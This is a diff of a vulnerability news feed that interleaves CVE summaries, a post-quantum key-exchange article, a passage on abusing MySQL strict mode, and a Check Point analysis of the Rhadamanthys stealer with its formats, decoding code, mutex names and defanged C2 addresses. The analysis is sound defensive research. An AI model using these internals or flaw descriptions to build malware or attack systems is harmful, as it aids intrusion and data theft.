+]]></content:encoded></item><item><title>CVE-2025-10706 - Classified Pro &lt;= 1.0.14 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Plugin Installation</title><link>https://cvefeed.io/vuln/detail/CVE-2025-10706</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 07:15:32 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-10706
+ Oct. 16, 2025, 7:15 a.m. | 10 hours ago
+The Classified Pro theme for WordPress is vulnerable to unauthorized plugin installation due to a missing capability check in the 'cwp_addons_update_plugin_cb' function in all versions up to, and including, 1.0.14. This makes it possible for authenticated attackers, with subscriber-level access and above, to install arbitrary plugins on the affected site's server which may make remote code execution possible. Note: The required nonce for the vulnerability is in the CubeWP Framework plugin.
+ 8.8 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-10742 - Truelysell Core &lt;= 1.8.6 - Unauthenticated Arbitrary User Password Change</title><link>https://cvefeed.io/vuln/detail/CVE-2025-10742</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 07:15:32 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-10742
+ Oct. 16, 2025, 7:15 a.m. | 10 hours, 49 minutes ago
+The Truelysell Core plugin for WordPress is vulnerable to Arbitrary User Password Change in versions up to, and including, 1.8.6. This is due to the plugin providing user-controlled access to objects, letting a user bypass authorization and access system resources. This makes it possible for unauthenticated attackers to change user passwords and potentially take over administrator accounts. Note: This can only be exploited unauthenticated if the attacker knows which page contains the 'truelysell_edit_staff' shortcode.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-10850 - Felan Framework &lt;= 1.1.4 - Hardcoded Credentials</title><link>https://cvefeed.io/vuln/detail/CVE-2025-10850</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 07:15:32 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-10850
+ Oct. 16, 2025, 7:15 a.m. | 10 hours, 49 minutes ago
+The Felan Framework plugin for WordPress is vulnerable to improper authentication in versions up to, and including, 1.1.4. This is due to the hardcoded password in the 'fb_ajax_login_or_register' function and in the 'google_ajax_login_or_register' function. This makes it possible for unauthenticated attackers to log in as any existing user on the site, if they registered with facebook or google social login and did not change their password.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-55089 - Eclipse ThreadX FileX RAM disk driver buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-55089</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 06:33:40 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-55089
+ Oct. 16, 2025, 7:15 a.m. | 10 hours, 49 minutes ago
+In FileX before 6.4.2, the file support module for Eclipse Foundation ThreadX, there was a possible buffer overflow in the FileX RAM disk driver. It could cause a remote execurtion after receiving a crafted sequence of packets
+ 9.2 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-58778 - Ruijie Networks RG-EST300 SSH Default Credentials Disclosure and Privilege Escalation Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-58778</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 06:15:37 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-58778
+ Oct. 16, 2025, 6:15 a.m. | 11 hours ago
+Multiple versions of RG-EST300 provided by Ruijie Networks provide SSH server functionality. It is not documented in the manual, and enabled in the initial configuration. Anyone with the knowledge of the related credentials can log in to the affected device, leading to information disclosure, altering the system configurations, or causing a denial of service (DoS) condition.
+ 8.6 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>Quantum readiness: Hybridizing key exchanges</title><link>https://www.synacktiv.com/en/publications/quantum-readiness-hybridizing-key-exchanges</link><author>(Dayzerosec.com)</author><category>vulns</category><pubDate>Wed, 15 Oct 2025 23:58:55 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[# Quantum readiness: Hybridizing key exchanges
+
+Following our previous article on signatures hybridization, this article covers the basics of hybridizing your key exchanges to ensure maximal security of your data.
 
 Looking to improve your skills? Discover our **trainings** sessions! Learn more.
 
 
-## What is MySQL strict SQL mode?
+More urgently than digital signature schemes, the way we exchange shared secrets on the internet needs to transition to the post-quantum era. Because of a relatively insufficient hindsight regarding new “post-quantum” key exchange schemes, most institutions incentivize the use of hybrid schemes, combining the robustness of renowned classical schemes with the post-quantum protection offered by newer schemes. This blogpost details the state of the main concepts of hybrid key exchanges.
 
-Strict mode\[1\] controls how MySQL handles invalid or missing values in data-change statements such as `INSERT` or `UPDATE`. The case detailed in this article is when the value is out of range. What happens when a value is invalid for the current encoding?
+## Quick recap: definitions
 
-An over-simplification of the strict mode in this case:
+### Key Encapsulation Mechanisms
 
-Strict mode On
+Calling something a _Key Encapsulation Mechanism_ (KEM) is just a fancy way of referring to a generic solution to a problem you already know : how can Alice and Bob share a secret through a public channel? In classical cryptography, this problem is solved with a Diffie-Hellman key exchange: Alice and Bob publish their respective public keys, and mix their private key with each other’s public key to land on the same secret value, which only they can know. In post-quantum cryptography, various techniques exist to establish this shared secret, some of which have been discussed in a previous article about lattice-based schemes1.
 
-Strict mode Off
+A Key Encapsulation Mechanism is defined by three routines:
 
-Error
+- `KeyGen()`, responsible for generating a key pair consisting of a private part and a public part.
+- `Encaps(Kpub)`, responsible for generating a secret value and a “capsule”, which is a blob that can be transformed back into the secret value only by the possessor of the associated private key
+- `Decaps(Kpriv, caps)`, used to recover the secret value from the capsule, by using the corresponding private key
 
-Warning (silent)
+As an example, a classic Diffie-Hellman (DH) key exchange can be viewed as a KEM, by defining the three routines as follows:
 
-Nothing modified
+DH public parameters: a generator `g`
 
-Insert “adjusted” value (“closest values”)
+- `KeyGen()`: Pick a random integer `s`. Return `K_priv = s` and `K_pub = g ** s`
+- `Encaps(K_pub)`: Encaps can be seen as an Ephemeral Diffie-Hellman key exchange. Start by picking a random integer `x`, then compute the associated public key which will act as your capsule `caps = g ** x`, and the shared secret `secret = K_pub ** x`
+- `Decaps(caps, K_priv)`: Decaps simply computes the key exchange between the ephemeral public key and our own private key. `secret = caps ** K_priv`
 
-At this point, you guessed what could go wrong.
+### Hybridization
 
-## Set and check
+Hybridization is the practice of combining both post-quantum and classical schemes to obtain a new, more resilient scheme against both classical and quantum attacks. For more details, a more complete definition has already been covered in our previous blogpost about hybridizing signatures. We encourage you to read it, if you haven’t done so already2
 
-In fact, there is no “strict mode” that is “on” or “off”. There is a system variable named `sql_mode` that contains an array of values. If that array contains one of `STRICT_TRANS_TABLES` or `STRICT_ALL_TABLES` values or the combination mode `TRADITIONAL`, then MySQL is in “strict mode”.
+## Combining KEMs
 
-The documentation for MySQL 9.1\[2\] claims that the default value of `sql_mode` is the following.
+KEM combiners were studied in depth by F. Giacon, F. Heuer and B. Poettering in a 2018 research paper3. In this paper, they introduce a general construction for combiners, where all the key exchanges are performed in parallel. The actual combination work is performed at the end, as a function _W_ of all shared secrets, capsules and public keys, which outputs the combined shared secret.
 
-```
-ONLY_FULL_GROUP_BY STRICT_TRANS_TABLES NO_ZERO_IN_DATE NO_ZERO_DATE ERROR_FOR_DIVISION_BY_ZERO NO_ENGINE_SUBSTITUTION
-```
+In the following parts, we study such functions and provide hindsights into why they may or may not be pertinent choices.
 
-The default value may differ on other versions or alternative backend engines such as MariaDB or Percona Server. The `@@sql_mode` system variable allows to query the current value.
+### Concatenating the shared secrets
 
-```
-[u]> SELECT @@sql_mode\G; @@sql_mode: STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION
-```
-
-Installation programs may configure the SQL mode during the installation process. So even if the strict mode is enabled by default, XAMPP, CMS, etc. may silently disable it.
-
-The violent method to disable strict mode (and everything else) is:
+A first approach one might take when it comes to combining many secrets into one is simply to concatenate them all.
 
 ```
-SET sql_mode='';
+- CombiKEM.KeyGen(): S_X, P_X <= KEM_X.KeyGen() S_Y, P_Y <= KEM_Y.KeyGen() S <= S_X, S_Y P <= P_X, P_Y return S, P - CombiKEM.Encaps(P): P_X, P_Y <= Split(P) ss_X, caps_X <= KEM_X.Encaps(P_X) ss_Y, caps_Y <= KEM_Y.Encaps(P_Y) ss <= ss_X || ss_Y <--- W caps <= caps_X, caps_Y return ss, caps - CombiKEM.Decaps(caps, S): caps_X, caps_Y <= Split(caps) S_X, S_Y <= S ss_X <= KEM_X.Decaps(caps_X, S_X) ss_Y <= KEM_Y.Decaps(caps_Y, S_Y) ss <= ss_X || ss_Y <--- W return ss
 ```
 
-## Observations
+However, there are a few reasons why this might not be the best thing to do:
 
-Let's create a table using ASCII encoding where it is easy to insert invalid values and see what happens when the strict mode is on and off.
+- the length of the final shared secret varies with the number of combined KEMs and their output sizes
+- if one of the KEMs was to be broken, the final shared secret would be partially known to an attacker. As such, it would not entirely be “secret” anymore
 
-```
--- Create a table with a column using a narrow space encoding on purpose CREATE TABLE uni_sandbox ( id INT AUTO_INCREMENT PRIMARY KEY, data VARCHAR(255) CHARACTER SET ascii ); -- Strict mode enabled SET sql_mode='STRICT_ALL_TABLES'; INSERT INTO uni_sandbox (data) VALUES ('I ♥ Unicode'); -- => ERROR 1366 (22007): Incorrect string value: '\xE2\x99\xA5 Un...' for column `unicode8`.`uni_sandbox`.`data` at row 1 -- Strict mode disabled SET sql_mode=''; INSERT INTO uni_sandbox (data) VALUES ('I ♥ Unicode'); SELECT * FROM uni_sandbox\G; -- => data: I ? Unicode
-```
+Ideally, breaking all but one KEMs in our combiner should not give sufficient information to guess parts of the final shared secret. Intuitively, we want our KEM to diffuse the entropy that each KEM brings to all the bits of the final shared secret.
 
-With strict mode on, an error was triggered, with strict mode off, the data was inserted but `♥` was replaced by `?`. Oracle MySQL or MariaDB documentation says “convert the invalid value to the closest valid value” without explaining exactly how it works. In practice, strings longer than the column size will be truncated, integers rounded to the nearest values, but that is only for values that are overflowing. For values that are invalid (can't be represented in the encoding), each byte is replaced with a `?`.
+### Concatenating the shared secrets, then hashing
 
-## Attack context
+With the previous lessons about entropy diffusion learned, one can think of the following combiner as a next iteration:
 
-Imagine the following context: there is a web application, that is strictlly checking the user input. A generic method commonly used for validation is by using regular expressions (RegExp). Independently of the language, nearly all RegExp engines supports POSIX character classes. But years ago, with the generalization of the Unicode support, many engines extended the range of those classes to work on Unicode too (originally limited to ASCII). So for example, instead of matching alphanumeric characters only on the ASCII range ( `A-Za-z0-9`), it will also match characters from the corresponding Unicode categories like Letter ( `L`) and Number ( `N`) by default.
+This combiner concatenates **and then performs a key derivation operation** (for example with a hash function) on the shared secrets of the component KEMs together to form the final shared secret. This ensures that every output bit is dependant on every input bit, in terms of entropy. However, in a world where our ideal combiner must be “at least as good” as each ingredient KEM, this is still insufficient.
 
-Take the following example in Ruby with the character Latin Letter Bidental Percussive `ʭ`.
+To further prove this point, let us examine the notion of “session key indistinguishability” (discussed in two IACR papers3 4). It describes the ability for an adversary to distinguish a shared secret from a random blob, given the corresponding capsule.
 
-```
-/[[:alnum:]]/.match('ʭ') # => #]]></content:encoded></item><item><title>Nvidia and Adobe vulnerabilities</title><link>https://blog.talosintelligence.com/nvidia-and-adobe-vulnerabilities/</link><author>Kri Dontje</author><category>vulns</category><pubDate>Wed, 1 Oct 2025 18:38:55 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[This website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.
+_Session key indistinguishability can be thought of as guessing “what is in the box?”, given two possible answers._
 
-You can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page.]]></content:encoded></item><item><title>How Scattered Spider Exploited Weak Links in UK Retail Security</title><link>https://www.mdsec.co.uk/2025/10/how-scattered-spider-exploited-weak-links-in-uk-retail-security/</link><author>Admin</author><category>vulns</category><pubDate>Wed, 1 Oct 2025 14:27:42 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[This website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.
+We will cover two levels of session key indistinguishability here:
 
-You can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page.]]></content:encoded></item><item><title>Rhadamanthys 0.9.x – walk through the updates</title><link>https://research.checkpoint.com/2025/rhadamanthys-0-9-x-walk-through-the-updates/</link><author>shlomoo@checkpoint.com</author><category>vulns</category><pubDate>Wed, 1 Oct 2025 08:31:37 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[**Research by:** hasherezade
+- Indistinguishability against Chosen _Plaintext_ Attack (IND-CPA): The challenger provides a public key, a capsule, its associated shared secret and a random blob. The adversary has access to an _Encaps_ oracle which they may call as many times as they want, with any public key of their choice. At one point, the adversary must decide which one of the provided blobs is the shared secret wrapped by the provided capsule.
+- Indistinguishability against Chosen _Ciphertext_ Attack (IND-CCA): The challenger still provides a public key, a capsule, its associated shared secret and a random blob. The adversary now has access to an _Encaps(P)_ **and a** oracle (decapsulation being performed with the same key as the challenge) which they may call as many times as they want, on any input except the provided capsule. At one point, the adversary must decide which one of the provided blobs is the shared secret wrapped by the provided capsule. _Decaps(caps)_
 
-Rhadamanthys is a complex, multi-modular malware sold on the underground market since September 2022. It was first advertised by the actor “kingcrete2022.” From the outset, its design showed the hallmarks of experienced developers, and analysis soon revealed that it drew heavily from an earlier project by the same authors, Hidden Bee \[1\]. This strong foundation helped Rhadamanthys quickly gain traction: from a niche product, it grew into one of the dominant stealers in cybercrime campaigns and has even attracted interest from more advanced threat actors.
+To follow our “what’s in the box?” metaphor, you can think of IND-CPA as having access to a gift wrapping machine, allowing you to wrap as many objects as you want before taking your guess about what’s in the original box. IND-CCA gives you access to a wrapping **and** an unwrapping machine, to which you can ask anything but to unwrap the original box.
 
-Since its appearance, Check Point Research (CPR) has been closely tracking its development, noting constant updates and customization options. In previous publications, we explored the breadth of its features, internal design, and the execution flow of its components using v0.5 as an example. Much of that work remains relevant today, as the core architecture has stayed intact.
+A KEM’s security can be qualified with regards to these security properties, and we would like our combiner to be rated to the same session key indistinguishability level as the best ingredient KEM.
 
-However, with the release of v0.9.x, Rhadamanthys introduced changes that broke some of our previously published tools, including the custom format converter and string deobfuscator. This was a clear sign that the family had reached another milestone update, one significant enough to warrant a fresh analysis. In this blog, we present our findings on the latest release, v0.9.2.
+Sadly, the concatenate-then-hash combiner does not meet our expectations in the general case. Indeed, let’s consider two KEMs, KEM\_X and KEM\_Y. Let’s further say KEM\_X is IND-CCA secure, but KEM\_Y is broken in such a way that it is possible to find capsule/shared secret collisions for a fixed (but secret) private key _k_, i.e. for a certain caps, find caps′ ≠ caps such that Decaps(caps, _k_) =  = Decaps(caps′, _k_). We note that KEM\_Y is not IND-CCA secure; given a challenge (caps, _s_ _A_, _s_ _B_), an adversary can generate a capsule caps′ that collides with caps and then query the decapsulation oracle with Decaps(caps′). The adversary can then win the game using the shared secret returned by the oracle.
 
-It is worth noting that the initial loader of Rhadamanthys comes in multiple variants: it can be a .NET executable or a native Windows executable (32- or 64-bit). The main target of our analysis is the execution chain started by the native version. Although the first stage varies, the later stages are identical for all loader types.
+Indeed, when provided with a challenge (caps, _s_ _A_, _s_ _B_) (where caps is composed of _X_\_caps from KEM\_X and _Y_\_caps from KEM\_Y), the adversary is able to craft _Y_\_caps′ ≠ _Y_\_caps which decapsulate with KEM\_Y to the same shared secret. Thus, the adversary has two different capsules caps = _X_\_caps, _Y_\_caps and caps′ = _X_\_caps, _Y_\_caps′ which decapsulate with our combined KEM to the same shared secret. With the same argument as for KEM\_Y not being IND-CCA, the composite KEM is not IND-CCA while KEM\_X is IND-CCA.
 
-Rhadamanthys was initially promoted through posts on cybercrime forums, but soon it became clear that the author had a more ambitious plan to connect with potential customers and build visibility. In parallel, they launched a Telegram support channel, a Tor website with detailed product descriptions, and offered communication via Tox. Most recently, the website underwent a complete makeover, presenting a polished and professional image. The operators now brand themselves as “RHAD security” and “Mythical Origin Labs.”
-
-The new site showcases all of their products, including teasers for those still in development. Alongside Rhadamanthys – their flagship stealer – they also advertise _Elysium Proxy Bot_ and a _Crypt Service_. Version updates are also listed, though this section is not always up to date with actual releases.
-
-As before, Rhadamanthys is offered in tiered packages: from $299 per month for a self-hosted version, to $499 per month with a rented server and additional benefits. A special Enterprise tier, with individually negotiated pricing, is also available.
-
-The combination of the branding, product portfolio, and pricing structure suggest that the authors treat Rhadamanthys as a long-term business venture rather than a side project.
-
-For defenders, this professionalization signals that Rhadamanthys with its growing customer base and an expanding ecosystem is likely here to stay, making it important to track not only its malware updates but also the business infrastructure that sustains it.
-
-The release of version 0.9 was announced in February 2025, followed by subsequent updates 0.9.1 and 0.9.2. The official website, however, still lists only 0.9.1 (released in May). Its changelog includes a long list of updates, reproduced below:
+Note that a KEM with collisions like KEM\_Y in the previous demonstration can be instantiated with a Diffie-Hellman key exchange, given poor parameter choices:
 
 ```
-v0.9.1 (2025-05-18) - Redesigned database operation process, separated read and write operations. Ensures data write integrity - User management permission levels, introduced new worker, traffic merchant, removed observer mode - Optimized file packaging and CPU usage when exporting to directory. Significantly reduced log packaging export speed - TOR removed random address generation, fixed address permanently effective - Management login added 2FA OTP login verification - Client and task plugins, introduced memory mutex throughout the process, suppressing multiple executions on the same machine sending duplicate data - Client loading introduced tracking system, can interface with user's loading program. Program startup and data collection work will trigger WEBHOOK callback - When generating client files, directly select tags from list, generated files named by build tags - Support using multiple server lists for client building - Support relay jump page, real server URL encrypted stored in jump page - Build stub completely removed registry write operations, X64 version, added process injection switch, can choose self-process injection and new process injection - Task execution conditions added HWID condition - LOG display pagination list added log total count display - LOG list page added download count flag block - FILE download added, one-click package all exported logs into a compressed package, convenient for download - Telegram message template, added new filter categories - Added shim server work detection, 5 minutes offline, sends Telegram message notification - Fixed delete duplicate LOG function, keeps latest record - Fixed search function, fixed time search function - Agrent_X wallet, changed to Argent - a Kepler wallet changed to Keplr - API interface changes, added new API interfaces - Get device fingerprint information, added browser fingerprint information collection - Build stub redesigned, higher stability and reliability - Added nonascii: true configuration, supporting non-ASCII character password filtering
+# === DH params p=1277723 # p = 2*q + 1, with q=638861 also prime g=3 # order(g) = q # === KeyGen() # Alice privkey a = 130376 # Alice pubkey A = pow(g, a, p) # === Encaps(A) # Bob ephemeral private key b = 644734 # Bob ephemeral public key B = pow(g, b, p) # Shared secret and capsule ss, caps = pow(A, b, p), B # === Decaps(caps, a) assert pow(caps, a, p) == ss # === Collision ! # Other capsule, colliding (using the fact that `a` is even) v = 1277722 # order(v) = 2 caps_coll = (caps*v) % p assert caps != caps_coll and pow(caps_coll, a, p) == ss
 ```
 
-Several entries stand out, including the introduction of a global mutex to suppress duplicate executions, expanded process injection options, and a redesigned build stub. These indicate modifications to the core modules.
+As you can see, for a given capsule and a poorly chosen private key, a colliding capsule can be found instantly in this scheme.
 
-Version 0.9.2, released a few months later and already gaining traction, is not yet listed on the website.
+Nonetheless, according to M. Barbosa et al. 5, a “concatenate then hash” combination is secure if you can prove the _ciphertext second pre-image resistance_ of the component KEMs. This property was clearly not respected in our example, as KEM\_Y was specifically crafted to provide collisions, hence the IND-CCA breakdown of the resulting KEM.
 
-As always, such changelogs are written for customers and do not fully capture the points of greatest interest to researchers. However, they still provide useful hints about which areas of the stealer have changed. In the following sections, we present the results of our analysis and highlight the modifications we confirmed, together with several changes that were not documented in the public notes.
+### Concatenating shared secrets and capsules and then hashing
 
-The first thing that stands out in the updated release (0.9.2) is the introduction of a new message box that appears at the start of the malware. We encounter it as soon as we unpack the initial executable.
+For the general case, M. Campagna & A. Petcher’s paper from 20204 proposes to include the capsules and public keys of each KEM to the mix. This addition allows defending against the attack presented in the previous paragraph, as the final shared secrets of the colliding capsules will now differ. However, capsules and keys are much bigger for post-quantum algorithms than they are for classical ones. As such, this construction comes with a non-negligible overhead, in the form of a larger input to the key derivation function call.
 
-It’s a well-known fact is that most malware is distributed in a protective layer, meant to thwart static detection. The usual first step of analysis is to remove it and reach the core executable (it can be done automatically, i.e. with the help of tools like PE-sieve/HollowsHunter). Interestingly, after unpacking the latest Rhadamanthys (0.9.2), as we try to run the obtained executable, the warning message shows up, saying: “Do you want to run a malware? (Crypt build to disable this message)”.
-
-This message box is familiar to anyone who has ever analyzed the famous Lumma stealer (more info: here \[5\]).
-
-In the past, the Lumma stealer introduced a check aimed at preventing malware distributors from spreading the initial executable in its plain, unprotected form, which can be easily detected. It was also preventing unskilled distributors from getting their own machine infected. The malware checks the file from which it is deployed, and if it found familiar patterns at the defined offsets, it recognizes that it is running from the raw, unpacked sample. In such cases, instead of running malicious actions immediately, a pop-up is displayed, asking the user for permission to continue. An identical check is now performed by Rhadamanthys.
-
-At first glance, it may appear that both malware families share the same code, responsible for displaying the message. But upon closer inspection, we can see that completely different APIs are called along the way. In Lumma, opening and reading the file is implemented via raw syscalls, and the message box is executed via `NtRaiseHardError`.
-
-In Rhadamanthys, raw syscalls aren’t used, and the same message box is displayed by `MessageBoxW`.
-
-Both loaders are obfuscated, but the obfuscation patterns are different. In the case of the Rhadamanthys loader, the APIs used are static, but the code blocks that call them are disconnected – this obfuscation pattern reminds of some LLVM-based obfuscators.
-
-In contrast, Lumma code is much more coherent and can be decompiled. The important functions are called via syscalls, using a single proxy function:
-
-Therefore, despite the surface-level similarity, it seems to be just a behavioral mimicry. We don’t have any proof of links between the Lumma development group and Rhadamanthys; however, it is possible that after Europol’s operation earlier this year, some members of the original Lumma team joined the promising competitor.
-
-This message box occurs in the Stage 1 executable. Typically for Rhadamanthys, this executable runs a shellcode in memory, which loads Stage 2, that consist of multiple modules. Its core modules are implemented in a format proprietary to this malware that we denote as XS.
-
-Since its inception, Rhadamanthys has shipped its executable modules in custom formats rather than the standard PEs. Only the first stage (the initial component), is a typical Windows executable. Its role is to prepare and deploy the set of components, that are unpacked from the internal package.
-
-Custom formats preserve all the essential components of an executable, such as relocations, import tables, and sections with access rights – but this information is stored in headers fully reinvented by the authors. Unlike PE or ELF files, which are natively supported by the operating systems, custom executables require proprietary loaders. This acts as a form of obfuscation, as standard tools can’t parse them. In addition, the absence of expected headers makes it more difficult to dump those components from memory, and reconstruct them.
-
-The evolution of the custom formats used by Rhadamanthys was described in detail in our earlier work _From Hidden Bee to Rhadamanthys_, along with a tool to convert them into PE for easier study (available here). Since version 0.5, Rhadamanthys modules used formats starting with the magic value `XS`. Two subtypes exist, used at different stages of execution (details outlined here):
-
-In v0.9.x, both formats received updates, which we label **XS1\_B** and **XS2\_B**.
-
-The first subtype (XS1) contains an extended header, with a field denoting the version number. The current variant is version 4, a direct increment over the previously described one.
-
-The header of the XS1\_B can be described by the following structure:
+To avoid this performance drawback, the IETF’s Composite ML-KEM draft6 proposes a different method. By proving that ML-KEM has ciphertext second pre-image resistance, they can safely omit the large ML-KEM capsule and public key from the KDF input. This approach maintains the required IND-CCA security without the performance penalty.
 
 ```
-#pragma pack(push, 1) // Adjust to one byte typedef struct { WORD magic; WORD nt_magic; WORD sections_count; **//WORD imp_key; <- removed** WORD hdr_size; BYTE ver; **BYTE imp_key; // <- added here** DWORD module_size; DWORD entry_point; t_XS_data_dir data_dir[XS_DATA_DIR_COUNT]; t_XS_section sections; } t_XS_format_B; #pragma pack(pop) // Back to the previous settings
-```
+KemCombiner]]></content:encoded></item><item><title>CVE-2025-43281 - Apple macOS Sequoia Privilege Escalation Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-43281</link><author></author><category>vulns</category><pubDate>Wed, 15 Oct 2025 20:15:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-43281
+ Oct. 15, 2025, 8:15 p.m. | 21 hours ago
+The issue was addressed with improved authentication. This issue is fixed in macOS Sequoia 15.6. A local attacker may be able to elevate their privileges.
+ 8.4 | HIGH
 
-The major change that we can observe is a lack of the WORD field before the header size. In the previous version (XS1\_A) this field stood for the key that was used for deobfuscating the names of the DLLs, used in the custom Import Table. Now this field is removed, because the deobfuscating algorithm has been replaced with the new one:
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-11619 - Devolutions Server SSL/TLS Certificate Validation Bypass</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11619</link><author></author><category>vulns</category><pubDate>Wed, 15 Oct 2025 20:15:34 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11619
+ Oct. 15, 2025, 8:15 p.m. | 21 hours ago
+Improper certificate validation when connecting to gateways in Devolutions Server 2025.3.2 and earlier allows attackers in MitM position to intercept traffic.
+ 8.8 | HIGH
 
-```
-bool decode_name_B(BYTE* dll_name, size_t name_len) { if (!name_len) { return false; } BYTE out_name[128] = { 0 }; size_t indx = 0; size_t pos = 0; size_t flag = 0; for (size_t i = 0; i < name_len; ++i) { BYTE outC = 0; for (WORD round = 7; round > 0; round--) { BYTE val = dll_name[indx]; if (pos) { flag = (val >> (7 - pos)) & 1; if (pos == 7) { pos = 0; ++indx; } else { ++pos; } } else { flag = val >> 7; pos = 1; } outC |= (flag != 0) << (round - 1); } if (!is_valid_dll_char(outC)) { return false; } out_name[i] = outC; } out_name[name_len] = 0; ::memcpy(dll_name, out_name, name_len); return true; }
-```
-
-Still, the malware uses an import deobfuscation key ( `imp_key`) to resolve imported functions. This time the key is shorter, only one BYTE long. It is used in calculating checksums that are then mapped to particular functions’ names.
-
-The next stage format (XS2\_B) underwent some lighter modifications. The only thing that changed was one of the fields in the custom import structure: it was extended from WORD to DWORD. This field carries the name of the DLL. In the past it could be carried in an obfuscated form, now it is used as is.
-
-```
-#pragma pack(push, 1) // Adjust to one byte typedef struct { DWORD dll_name_rva; DWORD first_thunk; DWORD original_first_thunk; **DWORD obf_dll_len; //WORD obf_dll_len;** } t_XS_import_B; #pragma pack(pop) // Back to the previous settings
-```
-
-As we can see, the changes do not add any new qualities to the format. The most likely role of the restructuring is to invalidate earlier parsers. It reflects the ongoing pattern of incremental churn aimed at slowing analysts down.
-
-All the changes are now reflected in the updates to our tool, and the new modules can be successfully converted into PE.
-
-The Stage 2 core, implemented as an XS1 module, starts its execution with various checks that are used to decide if the malware should continue its execution. Most of them have not changed since earlier versions. However, some underwent makeovers.
-
-In the past, in consecutive versions of Rhadamanthys, it used the `SibCode` registry keys in order to save the timestamp of the last execution. Depending on the version, the keys may look like one of the following:
-
- `HKCU\SOFTWARE\SibCode\sn` `HKCU\SOFTWARE\SibCode\sn2` `HKCU\SOFTWARE\SibCode\sn3`
-
-It was introduced to prevent the sample from being executed again too quickly after the first deployment. While initially the timestamp was saved as a single DWORD, in consecutive releases the author put more effort into making it tamper-proof. It was described in detail in \[4\] under “Re-Execution Delay Feature”. The presence of this registry key was one of the easy-to-notice symptoms of Rhadamanthys infection. This is probably the reason why the author gave it up completely, mentioning in the 0.9.1 changelog: _“Build stub completely removed registry write operations”_ **.** Indeed by checking the code we can confirm that the relevant function is now absent.
-
-In the earlier releases, Rhadamanthys used to create its mutex in a somewhat repeatable manner, based on a hash made of hardcoded values. This allowed researchers to create a universal vaccine (described in \[4\]). Now, the author decided to evade this simple way of preventing the malware from running.
-
-Since 0.9, the Rhadamanthys configuration (described further) includes a 16-byte seed value that participates in mutex name generation. It is hashed along with the magic `XRHY`. The first 16 bytes of the hash are then split into chunks and formatted into the Mutex name:
-
-Possible format strings for the generation of mutexes:
-
-```
-"Global\MSCTF.Asm.{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}" "Session\%u\MSCTF.Asm.{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}" "MSCTF.Asm.{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}"
-```
-
-If creation of the first mutex option fails, the second is applied, with an index after “Session” that can be in the range 1-8.
-
-Depending on the flags set in the configuration, the mutex can be passed into all the processes where Rhadamanthys injects its modules (by duplicating the handle). This feature is enabled by default and disabled if the flag `0x40` or `0x20` is set. Knowing this, we can search for the handle of the mutex in other processes, to check which belong to the same Rhadamanthys execution tree.
-
-The main Rhadamanthys module is shipped with an obfuscated configuration, which is decrypted and parsed at the beginning of the execution. It contains the C2 address, encryption keys used along the way, and various flags that specify which features of the malware will be enabled or disabled. This configuration has evolved considerably across consecutive versions. The explanation of the used fields in a relatively new version (0.7) has been provided in \[4\].
-
-The magic `0x59485221` ( `!RHY` ) has been used by this malware since the beginning of its existence. However, in the recent version 0.9.2, it is replaced with the `0xBEEF` DWORD (first noted here). Also, the configuration content has been significantly extended.
-
-The unpacked configuration, starting with `0xBEEF` markers, is not the final version but a compressed form. After the appropriate arguments are fetched, LZO decompression is applied. The result looks as follows:
-
-While in the past the config allowed one C2 per sample, multiple options are now allowed. Example:
-
-```
-hxxps://193.233.126.43/gateway/iesm4j25.s4pj7 hxxps://193.23.216.48/gateway/iesm4j25.s4pj7
-```
-
-Structure illustrating the new config (after decompression):
-
-```
